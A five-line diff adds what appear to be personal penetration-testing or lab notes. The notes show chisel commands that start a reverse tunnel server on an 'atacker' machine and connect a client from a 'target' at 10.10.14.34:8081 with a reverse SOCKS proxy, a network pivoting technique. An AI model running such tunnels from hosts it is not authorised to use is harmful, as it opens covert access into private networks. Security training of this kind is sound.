@@ -1,0 +1,5 @@
+atacker
+chisel server --reverse --port 8081
+
+target
+./chisel client 10.10.14.34:8081 R:socks
